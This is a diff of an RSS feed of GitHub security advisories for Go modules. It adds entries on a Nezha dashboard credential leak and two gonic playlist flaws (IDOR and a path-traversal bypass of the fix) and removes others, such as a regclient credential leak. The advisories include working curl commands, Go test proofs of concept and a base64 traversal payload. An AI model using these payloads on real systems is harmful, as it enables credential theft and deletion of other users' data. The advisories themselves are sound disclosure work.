@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-06-26T23:23:09.845Z</updated>
+    <updated>2026-06-27T00:27:21.673Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,361 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/nezhahq/nezha] Nezha Dashboard: DDNS and Notification credential exposure via unredacted list API]]></title>
+        <id>https://github.com/advisories/GHSA-ww5p-j6cj-6mqq</id>
+        <link href="https://github.com/advisories/GHSA-ww5p-j6cj-6mqq"/>
+        <updated>2026-06-26T23:55:28.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>GET /api/v1/ddns</code> and <code>GET /api/v1/notification</code> endpoints return full resource objects including plaintext third-party API credentials — Cloudflare API tokens, TencentCloud SecretKeys, Slack/Discord/Telegram webhook URLs with embedded bot tokens, and Authorization header values — without any field-level redaction. Any authenticated admin who calls these endpoints receives every stored credential in the system in a single API response. A compromised admin session or leaked PAT with <code>nezha:ddns:read</code> or <code>nezha:notification:read</code> scope exposes all third-party integration secrets.</p>
+<h3 id="details">Details</h3>
+<p>The <code>listDDNS</code> and <code>listNotification</code> handlers follow an identical pattern: they call the corresponding singleton <code>GetSortedList()</code>, <code>copier.Copy</code> the full in-memory structs into a response slice, and return them via <code>listHandler</code> with zero field stripping.</p>
+<p><strong>DDNS — <code>cmd/dashboard/controller/ddns.go:25–33</code>:</strong></p>
+<pre><code class="language-go">func listDDNS(c *gin.Context) ([]*model.DDNSProfile, error) {
+    var ddnsProfiles []*model.DDNSProfile
+    list := singleton.DDNSShared.GetSortedList()
+    if err := copier.Copy(&amp;ddnsProfiles, &amp;list); err != nil {
+        return nil, err
+    }
+    return ddnsProfiles, nil
+}
+</code></pre>
+<p>The <code>DDNSProfile</code> struct (<code>model/ddns.go:20–36</code>) serializes <code>AccessSecret</code> with <code>json:"access_secret,omitempty"</code> — non-empty Cloudflare tokens and TencentCloud SecretKeys are returned in cleartext. The <code>WebhookURL</code> and <code>WebhookHeaders</code> fields may also contain embedded secrets.</p>
+<p><strong>Notification — <code>cmd/dashboard/controller/notification.go:25–33</code>:</strong></p>
+<pre><code class="language-go">func listNotification(c *gin.Context) ([]*model.Notification, error) {
+    slist := singleton.NotificationShared.GetSortedList()
+    var notifications []*model.Notification
+    if err := copier.Copy(&amp;notifications, &amp;slist); err != nil {
+        return nil, err
+    }
+    return notifications, nil
+}
+</code></pre>
+<p>The <code>Notification</code> struct (<code>model/notification.go:34–44</code>) serializes <code>URL</code>, <code>RequestHeader</code>, and <code>RequestBody</code> — all of which commonly contain embedded bot tokens (Slack, Discord, Telegram), API keys in Authorization headers, and webhook secrets.</p>
+<p><strong>Route and authorization (<code>cmd/dashboard/controller/controller.go:155, 171</code>):</strong></p>
+<pre><code class="language-go">auth.GET("/notification", restScopeMiddleware(model.ScopeNotificationRead), listHandler(listNotification))
+auth.GET("/ddns", restScopeMiddleware(model.ScopeDDNSRead), listHandler(listDDNS))
+</code></pre>
+<p>Both routes are behind <code>authMw</code> (JWT or PAT) and the corresponding read scope. The <code>listHandler</code> → <code>filter</code> chain uses <code>HasPermission</code> (<code>model/common.go:63–82</code>) which grants admins access to ALL profiles and restricts members to their own. No separate response struct or field masking exists anywhere in the codebase — confirmed by exhaustive search for <code>DDNSResponse</code>, <code>DDNSView</code>, <code>NotificationResponse</code>, <code>NotificationView</code>, or any JSON middleware that strips sensitive fields.</p>
+<p>The codebase already demonstrates awareness of this pattern: <code>serverConfigSensitiveScope()</code> in <code>cmd/dashboard/controller/api_token_scope.go:117</code> was introduced to restrict <code>client_secret</code> exposure via <code>GET /server/config/:id</code>, tightening the scope from <code>ScopeServerRead</code> to <code>ScopeServerWrite</code>. No equivalent protection exists for the DDNS or Notification list endpoints.</p>
+<p><strong>Tested at commit <code>3d74cd94</code> (master, post v2.2.3).</strong> The vulnerable pattern has existed since the DDNS and notification list endpoints were introduced.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li><p>Deploy nezha with at least one admin user. Configure a DDNS profile with a Cloudflare API token (AccessSecret) and a Notification webhook pointing to a Slack incoming webhook URL (<code>https://hooks.slack.com/services/T.../B.../xxx...</code>).</p>
+</li>
+<li><p>Authenticate as the admin user. Call:</p>
+<pre><code class="language-bash"># DDNS credentials exposed
+curl -s -H "Authorization: Bearer &lt;admin_jwt&gt;" \
+  https://dashboard.example.com/api/v1/ddns \
+  | jq '.data[].access_secret'
+
+# Notification webhook secrets exposed
+curl -s -H "Authorization: Bearer &lt;admin_jwt&gt;" \
+  https://dashboard.example.com/api/v1/notification \
+  | jq '.data[].url'
+</code></pre>
+</li>
+<li><p>Observe the full Cloudflare API token, Slack webhook URL with embedded token, and any <code>RequestHeader</code> values (e.g., <code>Authorization: Bearer ...</code>) returned in cleartext.</p>
+</li>
+<li><p>Alternatively, create a PAT with <code>nezha:ddns:read</code> scope:</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer nzp_&lt;pat_secret&gt;" \
+  https://dashboard.example.com/api/v1/ddns \
+  | jq '.data[].access_secret'
+</code></pre>
+<p>If the PAT creator is an admin, all DDNS secrets are returned in a single response.</p>
+</li>
+<li><p><strong>Negative control:</strong> A member (non-admin) calling the same endpoints only sees their own profiles due to the <code>HasPermission</code> filter (<code>model/common.go:63–82</code>). However, an admin sees ALL profiles with ALL secrets. The security boundary crossed is the credential confidentiality boundary — a read-only listing endpoint should not return write-capable credentials.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>An attacker who compromises an admin session or obtains a PAT with the appropriate read scope can exfiltrate all third-party API credentials stored in the dashboard — Cloudflare API tokens, TencentCloud SecretKeys, Slack/Discord/Telegram bot tokens, and any secrets embedded in webhook URLs or Authorization headers. These credentials can then be used to:</p>
+<ul>
+<li>Modify DNS records for any domain managed via Cloudflare/TencentCloud DDNS profiles</li>
+<li>Send messages as the Slack/Discord/Telegram bot to any configured channel</li>
+<li>Access any other API the compromised credentials grant access to</li>
+</ul>
+<p>The attack requires high privileges (admin JWT or PAT with appropriate scope), but the impact is amplified because a single API call exposes ALL stored credentials across ALL DDNS profiles and ALL notification webhooks, with no field-level access control separating metadata from secrets.</p>
+<p><strong>Suggested remediation:</strong> Introduce separate response structs (e.g., <code>DDNSProfileResponse</code>, <code>NotificationResponse</code>) that omit sensitive fields (<code>AccessSecret</code>, <code>WebhookHeaders</code>, <code>URL</code>, <code>RequestHeader</code>) from list/read endpoints, or use <code>json:"-"</code> tags on sensitive fields and provide them only through a dedicated credential-retrieval endpoint with stricter authorization (analogous to the existing <code>serverConfigSensitiveScope()</code> pattern).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nezhahq/nezha/security/advisories/GHSA-ww5p-j6cj-6mqq">https://github.com/nezhahq/nezha/security/advisories/GHSA-ww5p-j6cj-6mqq</a></li>
+<li><a href="https://github.com/advisories/GHSA-ww5p-j6cj-6mqq">https://github.com/advisories/GHSA-ww5p-j6cj-6mqq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-ww5p-j6cj-6mqq</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-26T23:55:26.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[go.senan.xyz/gonic] Subsonic API: any authenticated user can delete or read any other user's playlist (IDOR)]]></title>
+        <id>https://github.com/advisories/GHSA-hmgp-w9jm-vp95</id>
+        <link href="https://github.com/advisories/GHSA-hmgp-w9jm-vp95"/>
+        <updated>2026-06-26T23:33:26.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>In gonic, the Subsonic API endpoints <code>/rest/deletePlaylist.view</code> and <code>/rest/getPlaylist.view</code> perform no per-resource authorization. Once authenticated as <em>any</em> user (admin or not), an attacker can:</p>
+<ol>
+<li><strong>Delete any playlist owned by any other user</strong> (including admin) by passing its <code>id</code>.</li>
+<li><strong>Read the full contents</strong> (name, comment, song list) of any other user's <strong>private</strong> (non-public) playlist by passing its <code>id</code>.</li>
+</ol>
+<p>The Subsonic playlist <code>id</code> is <code>base64url("&lt;userID&gt;/&lt;filename&gt;.m3u")</code>. Because filenames are user-supplied or time-derived and the <code>userID</code> is a small integer, IDs are guessable and frequently exposed (e.g. a previously-public playlist that was later made private still has the same ID).</p>
+<p>This breaks the multi-user trust boundary of gonic: a low-privileged user can wipe an administrator's curated playlists, and a user can exfiltrate any private playlist they obtain an ID for.</p>
+<h2 id="status">Status</h2>
+<p>This was originally disclosed to the maintainer by email and has been <strong>fixed in commit <code>6dd71e6a3c966867ef8c900d359a7df75789f410</code></strong> (<code>fix(subsonic): enforce playlist ownership on getPlaylist/deletePlaylist</code>, 2026-05-18). The fix has not yet been included in a tagged release; the latest tagged version <code>v0.20.1</code> is still vulnerable. Filing this advisory now that private vulnerability reporting is enabled on the repo, so the issue has a public record once the next release ships.</p>
+<h2 id="vulnerable-code-pre-fix-at-v0201--commit-37090aa7">Vulnerable code (pre-fix, at <code>v0.20.1</code> / commit <code>37090aa7</code>)</h2>
+<p><strong>Delete IDOR</strong> — <code>server/ctrlsubsonic/handlers_playlist.go</code> lines 177-187:</p>
+<pre><code class="language-go">func (c *Controller) ServeDeletePlaylist(r *http.Request) *spec.Response {
+    params := r.Context().Value(CtxParams).(params.Params)
+    playlistID, err := params.GetFirstID("id", "playlistId")
+    if err != nil {
+        return spec.NewError(10, "please provide an `id` or `playlistId` parameter")
+    }
+    if err := c.playlistStore.Delete(playlistIDDecode(playlistID)); err != nil {
+        return spec.NewError(0, "delete playlist: %v", err)
+    }
+    return spec.NewResponse()
+}
+</code></pre>
+<p>The handler never loads the playlist to check <code>playlist.UserID == user.ID</code>. Compare to <code>ServeUpdatePlaylist</code> (same file, line 138) which <em>does</em> perform this check.</p>
+<p><strong>Read IDOR</strong> — <code>server/ctrlsubsonic/handlers_playlist.go</code> lines 51-68:</p>
+<pre><code class="language-go">func (c *Controller) ServeGetPlaylist(r *http.Request) *spec.Response {
+    params := r.Context().Value(CtxParams).(params.Params)
+    playlistID, err := params.GetFirstID("id", "playlistId")
+    if err != nil {
+        return spec.NewError(10, "please provide an `id` parameter")
+    }
+    playlist, err := c.playlistStore.Read(playlistIDDecode(playlistID))
+    if err != nil {
+        return spec.NewError(70, "playlist with id %s not found", playlistID)
+    }
+    // ... never checks playlist.UserID or playlist.IsPublic ...
+    sub.Playlist = rendered
+    return sub
+}
+</code></pre>
+<p>The listing endpoint <code>ServeGetPlaylists</code> (line 38) correctly filters by <code>playlist.UserID != user.ID &amp;&amp; !playlist.IsPublic</code>, but the singular <code>getPlaylist</code> did not.</p>
+<h2 id="live-poc-passing-go-test">Live PoC (passing Go test)</h2>
+<p>A reproducer against the existing test fixture (<code>server/ctrlsubsonic</code>):</p>
+<pre><code class="language-go">func TestIDOR_DeleteOtherUsersPlaylist(t *testing.T) {
+    f := newFixture(t)
+    victimRelPath := filepath.Join("1", "victim-private.m3u")
+    _ = f.contr.playlistStore.Write(victimRelPath, &amp;playlistp.Playlist{
+        UserID: f.admin.ID, Name: "victim-private", IsPublic: false,
+        Items: []string{"/music/foo.flac"},
+    })
+    victimID := playlistIDEncode(victimRelPath).String()
+    // f.alt is a non-admin, non-owner user
+    body := f.query(t, f.contr.ServeDeletePlaylist, f.alt, url.Values{"id": {victimID}})
+    // Subsonic returns status="ok" and the file is gone.
+}
+</code></pre>
+<p>Test output:</p>
+<pre><code>--- PASS: TestIDOR_ReadOtherUsersPrivatePlaylist (0.07s)
+--- PASS: TestIDOR_DeleteOtherUsersPlaylist (0.07s)
+PASS
+ok  go.senan.xyz/gonic/server/ctrlsubsonic 0.730s
+</code></pre>
+<h2 id="equivalent-http-request">Equivalent HTTP request</h2>
+<pre><code>GET /rest/deletePlaylist.view?u=lowpriv&amp;p=lowpriv&amp;v=1&amp;c=poc&amp;f=json&amp;id=cGwtMS1zaGFyZWQubTN1
+</code></pre>
+<p>Response: <code>{"subsonic-response":{"status":"ok","version":"..."}}</code> — playlist is gone.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Integrity / Availability</strong>: low-privileged users can delete any other user's playlists, including admin's curated lists. There is no undo.</li>
+<li><strong>Confidentiality</strong>: private playlists (including their comment fields) are readable by any authenticated user with an ID. IDs are predictable (<code>base64("&lt;smallUserID&gt;/&lt;name&gt;.m3u")</code>) and previously-public IDs persist after being marked private.</li>
+<li><strong>Trust boundary</strong>: gonic supports multiple users (<code>createUser</code>, non-admin role). This bug collapsed the user-to-user authorization model.</li>
+</ul>
+<h2 id="affected-versions">Affected versions</h2>
+<p>Latest tagged release <code>v0.20.1</code> and all prior versions back to when the playlist M3U store was introduced. Master HEAD is fixed at commit <code>6dd71e6a3c966867ef8c900d359a7df75789f410</code>.</p>
+<h2 id="suggested-patch-applied-by-maintainer-in-6dd71e6">Suggested patch (applied by maintainer in <code>6dd71e6</code>)</h2>
+<p>Load the playlist first and enforce ownership in both handlers:</p>
+<pre><code class="language-go">// ServeGetPlaylist
+if playlist.UserID != user.ID &amp;&amp; !playlist.IsPublic {
+    return spec.NewError(50, "you aren't allowed to read that user's playlist")
+}
+
+// ServeDeletePlaylist
+if playlist.UserID != 0 &amp;&amp; playlist.UserID != user.ID {
+    return spec.NewError(50, "you aren't allowed to delete that user's playlist")
+}
+</code></pre>
+<p>This mirrors the existing ownership check already present in <code>ServeCreateOrUpdatePlaylist</code> (line 84) and <code>ServeUpdatePlaylist</code> (line 138).</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by Vishal Shukla (<a href="https://github.com/shukla304">@shukla304</a> / <a href="https://github.com/therawdev">@therawdev</a>).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sentriz/gonic/security/advisories/GHSA-hmgp-w9jm-vp95">https://github.com/sentriz/gonic/security/advisories/GHSA-hmgp-w9jm-vp95</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49338">https://nvd.nist.gov/vuln/detail/CVE-2026-49338</a></li>
+<li><a href="https://github.com/sentriz/gonic/commit/6dd71e6">https://github.com/sentriz/gonic/commit/6dd71e6</a></li>
+<li><a href="https://github.com/advisories/GHSA-hmgp-w9jm-vp95">https://github.com/advisories/GHSA-hmgp-w9jm-vp95</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hmgp-w9jm-vp95</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-26T23:33:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[go.senan.xyz/gonic] gonic: Path Traversal in playlist `id` bypasses ownership check, enabling any user to read/delete other users' playlists]]></title>
+        <id>https://github.com/advisories/GHSA-2fp4-5v5c-4448</id>
+        <link href="https://github.com/advisories/GHSA-2fp4-5v5c-4448"/>
+        <updated>2026-06-26T23:32:12.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The maintainer's recent fix in <a href="https://github.com/sentriz/gonic/commit/6dd71e6"><code>6dd71e6a3c966867ef8c900d359a7df75789f410</code></a> (<code>fix(subsonic): enforce playlist ownership on getPlaylist/deletePlaylist</code>) added an ownership check based on <code>playlist.UserID</code>. However, <code>playlist.UserID</code> is derived from the <em>first path segment</em> of the attacker-controlled playlist ID, with no path containment on the resolved file path.</p>
+<p><strong>Any authenticated Subsonic user</strong> can therefore bypass the ownership check and:</p>
+<ol>
+<li><strong>Read any other user's playlist</strong> (name, comment, IsPublic flag, song list) by crafting a base64-encoded playlist ID whose first segment matches their own user ID, followed by <code>..</code> traversal segments pointing into another user's playlist directory.</li>
+<li><strong>Delete any other user's playlist</strong> (including admin's curated playlists) by the same trick against <code>deletePlaylist</code>.</li>
+<li><strong>Probe arbitrary file paths on the host</strong> for existence/readability.</li>
+</ol>
+<p>This is a bypass of the boundary the 6dd71e6 fix is trying to enforce; it is closely related to the original GONIC-1 IDOR but uses a different primitive (path traversal in the <code>id</code> parameter rather than direct cross-user access).</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>server/ctrlsubsonic/handlers_playlist.go::playlistIDDecode</code> performs raw base64 decode of the <code>id</code> parameter and passes the byte string straight to <code>playlistStore.Read/Delete</code>:</p>
+<pre><code class="language-go">func playlistIDDecode(id specid.ID) string {
+    path, _ := base64.URLEncoding.DecodeString(id.StringValue)
+    return string(path)
+}
+</code></pre>
+<p><code>playlist/playlist.go::Store.Read</code> then:</p>
+<pre><code class="language-go">absPath := filepath.Join(s.basePath, relPath)   // no containment check
+// ...
+playlist.UserID, err = userIDFromPath(relPath)  // extracts firstPathEl, e.g. "2"
+if err != nil {
+    playlist.UserID = 1                          // fallback
+}
+</code></pre>
+<p><code>userIDFromPath</code> reads only the first segment via <code>firstPathEl(relPath)</code> (<code>strconv.Atoi</code> of <code>strings.Split(path, "/")[0]</code>). It does not validate that the cleaned absolute path stays under <code>s.basePath</code>.</p>
+<p>The <code>id</code> parameter is base64-decoded as raw bytes (no path cleaning at decode time), so a payload like <code>"2/../../&lt;victim&gt;/playlist.m3u"</code> is preserved verbatim. <code>userIDFromPath</code> extracts <code>"2"</code> (the attacker's own user ID), <code>playlist.UserID = 2</code>, and the ownership check <code>playlist.UserID != user.ID &amp;&amp; !playlist.IsPublic</code> becomes <code>2 != 2 &amp;&amp; ...</code> → <strong>false</strong> → access allowed. Meanwhile <code>filepath.Join</code> resolves the <code>..</code> segments and escapes <code>basePath</code>.</p>
+<h2 id="affected-code">Affected code</h2>
+<ul>
+<li><code>playlist/playlist.go:88-144</code> — <code>Store.Read</code> joins <code>relPath</code> with <code>basePath</code> without containment validation</li>
+<li><code>playlist/playlist.go:200-206</code> — <code>Store.Delete</code> (same pattern)</li>
+<li><code>playlist/playlist.go:208-220</code> — <code>userIDFromPath</code> / <code>firstPathEl</code> trust only the first path segment</li>
+<li><code>server/ctrlsubsonic/handlers_playlist.go:51-72</code> — <code>ServeGetPlaylist</code> ownership check</li>
+<li><code>server/ctrlsubsonic/handlers_playlist.go:182-202</code> — <code>ServeDeletePlaylist</code> ownership check</li>
+<li><code>server/ctrlsubsonic/handlers_playlist.go:209-212</code> — <code>playlistIDDecode</code> (no validation)</li>
+</ul>
+<h2 id="live-poc--passing-go-test">Live PoC — passing Go test</h2>
+<p>Drop this into <code>server/ctrlsubsonic/handlers_playlist_read_traversal_test.go</code> and run <code>go test -run TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix ./server/ctrlsubsonic/ -v</code>:</p>
+<pre><code class="language-go">package ctrlsubsonic
+
+import (
+    "fmt"
+    "net/url"
+    "os"
+    "path/filepath"
+    "testing"
+
+    "github.com/stretchr/testify/require"
+)
+
+func TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix(t *testing.T) {
+    f := newFixture(t)
+    t.Logf("alt user ID: %d, admin user ID: %d", f.alt.ID, f.admin.ID)
+
+    // Plant a sentinel M3U file outside the playlists directory.
+    tmpDir := filepath.Dir(f.contr.musicPaths[0].Path)
+    sentinelDir := filepath.Join(tmpDir, "sensitive")
+    require.NoError(t, os.MkdirAll(sentinelDir, 0o755))
+    sentinelPath := filepath.Join(sentinelDir, "secret.m3u")
+    require.NoError(t, os.WriteFile(sentinelPath, []byte(`#GONIC-NAME:"victim-secret"
+#GONIC-COMMENT:"sensitive content"
+#GONIC-IS-PUBLIC:"false"
+`), 0o644))
+
+    // RAW string — playlistIDDecode does base64 only, no path cleaning.
+    rawRel := fmt.Sprintf("%d/../../sensitive/secret.m3u", f.alt.ID)
+    traversalID := playlistIDEncode(rawRel).String()
+
+    // f.alt is the NON-ADMIN user.
+    resp := f.query(t, f.contr.ServeGetPlaylist, f.alt, url.Values{"id": {traversalID}})
+    t.Logf("resp: %s", string(resp))
+
+    require.Contains(t, string(resp), "victim-secret",
+        "VULNERABLE: non-admin user (ID=%d) read playlist outside playlists/", f.alt.ID)
+}
+</code></pre>
+<p>Test output against current <code>master</code> HEAD <code>6dd71e6</code>:</p>
+<pre><code>=== RUN   TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix
+    alt user ID: 2, admin user ID: 1
+    resp: {"subsonic-response":{"status":"ok","version":"1.15.0","type":"gonic","openSubsonic":true,
+        "playlist":{"id":"pl-Mi8uLi8uLi9zZW5zaXRpdmUvc2VjcmV0Lm0zdQ==",
+        "name":"victim-secret","comment":"sensitive content","owner":"alt",
+        "songCount":0,"created":"...","changed":"...","duration":0}}}
+--- PASS: TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix (0.06s)
+</code></pre>
+<p>The same approach against <code>ServeDeletePlaylist</code> (<code>f.contr.ServeDeletePlaylist</code>) deletes the targeted file.</p>
+<h2 id="http-level-reproduction">HTTP-level reproduction</h2>
+<pre><code class="language-bash"># Attacker user (ID = N) reads target playlist owned by user M.
+# Construct the raw rel path: "N/../M/&lt;filename&gt;.m3u"
+ATTACKER_ID=2
+RAW='2/../1/shared.m3u'
+
+# base64-url-encode (no padding stripping needed since playlistIDDecode tolerates it)
+ID="pl-$(printf '%s' "$RAW" | base64 -w0 | tr '/+' '_-')"
+
+curl -s "http://gonic-host/rest/getPlaylist.view?u=attacker&amp;p=pass&amp;c=poc&amp;v=1.16.1&amp;f=json&amp;id=$ID" \
+  | python3 -m json.tool
+# Response includes name, comment, IsPublic, and song list from the victim's playlist.
+</code></pre>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Confidentiality</strong>: Any authenticated user can read any other user's playlist content, including the private (<code>IsPublic=false</code>) playlists that the recent 6dd71e6 fix specifically tried to protect.</li>
+<li><strong>Integrity / Availability</strong>: Any authenticated user can delete any other user's playlists, including admin's curated lists. Same bypass technique works against <code>ServeDeletePlaylist</code>.</li>
+<li><strong>Trust boundary</strong>: gonic explicitly supports multi-user deployments. This bug defeats the user-to-user authorization model that the maintainer just patched.</li>
+<li><strong>Arbitrary file content read</strong> is <em>constrained</em> by gonic's M3U parser — only <code>#GONIC-NAME:</code> / <code>#GONIC-COMMENT:</code> attributes from the target file survive parsing. File-existence probing works against arbitrary paths.</li>
+</ul>
+<h2 id="cvss">CVSS</h2>
+<p><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</code> = <strong>7.1 High</strong></p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Add path containment in <code>playlist/playlist.go</code> for <code>Store.Read</code>, <code>Store.Write</code>, and <code>Store.Delete</code> — reject any <code>relPath</code> that escapes <code>s.basePath</code> after <code>filepath.Join</code>:</p>
+<pre><code class="language-go">func (s *Store) contained(relPath string) (string, error) {
+    absPath := filepath.Join(s.basePath, relPath)
+    rel, err := filepath.Rel(s.basePath, absPath)
+    if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
+        return "", fmt.Errorf("path %q escapes playlist directory", relPath)
+    }
+    return absPath, nil
+}
+
+func (s *Store) Read(relPath string) (*Playlist, error) {
+    defer lock(&amp;s.mu)()
+    if err := sanityCheck(s.basePath); err != nil {
+        return nil, err
+    }
+    absPath, err := s.contained(relPath)
+    if err != nil {
+        return nil, err
+    }
+    // ... rest unchanged, using absPath
+}
+</code></pre>
+<p>Apply in <code>Write()</code> (line 153) and <code>Delete()</code> (line 206) as well. The ownership check at 6dd71e6 then becomes a defense-in-depth layer on top of the structural containment.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by Vishal Shukla (<a href="https://github.com/shukla304">@shukla304</a> / <a href="https://github.com/therawdev">@therawdev</a>).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sentriz/gonic/security/advisories/GHSA-2fp4-5v5c-4448">https://github.com/sentriz/gonic/security/advisories/GHSA-2fp4-5v5c-4448</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49339">https://nvd.nist.gov/vuln/detail/CVE-2026-49339</a></li>
+<li><a href="https://github.com/sentriz/gonic/commit/0824bed88f6bbc490ba28bf09d28e5dfeb07b445">https://github.com/sentriz/gonic/commit/0824bed88f6bbc490ba28bf09d28e5dfeb07b445</a></li>
+<li><a href="https://github.com/sentriz/gonic/commit/6dd71e6">https://github.com/sentriz/gonic/commit/6dd71e6</a></li>
+<li><a href="https://github.com/advisories/GHSA-2fp4-5v5c-4448">https://github.com/advisories/GHSA-2fp4-5v5c-4448</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2fp4-5v5c-4448</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-26T23:32:10.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[go.senan.xyz/gonic] gonic has arbitrary file write in createPlaylist: any authenticated user can write playlist M3U content to attacker-controlled path on the host]]></title>
         <id>https://github.com/advisories/GHSA-4gxv-p5g5-j7w7</id>
@@ -1216,166 +1571,5 @@ ok  	github.com/nezhahq/nezha/cmd/dashboard	0.132s
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-05-26T13:30:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost doesn't sanitize team member data when returned via API to users without elevated permissions]]></title>
-        <id>https://github.com/advisories/GHSA-ffpr-pfr4-g354</id>
-        <link href="https://github.com/advisories/GHSA-ffpr-pfr4-g354"/>
-        <updated>2026-06-26T22:48:00.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.6.x &lt;= 11.6.0, 11.5.x &lt;= 11.5.3, 11.4.x &lt;= 11.4.4, 10.11.x &lt;= 10.11.14 fail to sanitize team member data when returned via API to users without elevated permissions which allows a user without permissions to get data about team members roles via invoking various team API endpoints. Mattermost Advisory ID: MMSA-2026-00626.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3636">https://nvd.nist.gov/vuln/detail/CVE-2026-3636</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-ffpr-pfr4-g354">https://github.com/advisories/GHSA-ffpr-pfr4-g354</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ffpr-pfr4-g354</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-26T13:30:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/regclient/regclient] regclient may leak authentication credentials to external blob stores]]></title>
-        <id>https://github.com/advisories/GHSA-qvqc-4c52-x6qp</id>
-        <link href="https://github.com/advisories/GHSA-qvqc-4c52-x6qp"/>
-        <updated>2026-06-26T22:43:32.000Z</updated>
-        <content type="html"><![CDATA[<p>Credentials for a registry may be inadvertently leaked to external servers. A prerequisite for this attack is a malicious registry server, a malicious blob store, or a registry that does not restrict the external URLs for foreign blobs.</p>
-<h2 id="example-attack">Example attack</h2>
-<p>A malicious registry serves an OCI image manifest containing a layer descriptor with a <code>urls</code> field pointing to an attacker controlled host:</p>
-<pre><code class="language-json">{
-  "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
-  "digest": "sha256:...",
-  "size": 1024,
-  "urls": ["https://malicious.example.org/blobs/sha256/..."]
-}
-</code></pre>
-<p>When regclient fetches the image and the primary blob request to the registry fails, it falls back to the URLs in the layer descriptor. If the external server requests authentication, regclient would send the credentials for the original registry server.</p>
-<h2 id="timeline">Timeline</h2>
-<ul>
-<li>2026-05-25: Advisory submitted</li>
-<li>2026-05-26: Fix released</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<p>Theodoros Lampropoulos, Threat Detection Engineer, Odyssey Cyber Security</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/regclient/regclient/security/advisories/GHSA-qvqc-4c52-x6qp">https://github.com/regclient/regclient/security/advisories/GHSA-qvqc-4c52-x6qp</a></li>
-<li><a href="https://github.com/advisories/GHSA-qvqc-4c52-x6qp">https://github.com/advisories/GHSA-qvqc-4c52-x6qp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qvqc-4c52-x6qp</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-26T22:43:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/authelia/authelia/v4] Authelia has an Edge Case Access Control Rule Mismatch]]></title>
-        <id>https://github.com/advisories/GHSA-j748-h363-wqj8</id>
-        <link href="https://github.com/advisories/GHSA-j748-h363-wqj8"/>
-        <updated>2026-06-26T22:32:22.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p><strong>CVSSv4 Baseline Score:</strong> Low 2.4</p>
-<p><strong>CVSSv4 Weighted Score:</strong> Low 1.3</p>
-<p>The full CVSSv4 Vector for this vulnerability is:</p>
-<blockquote>
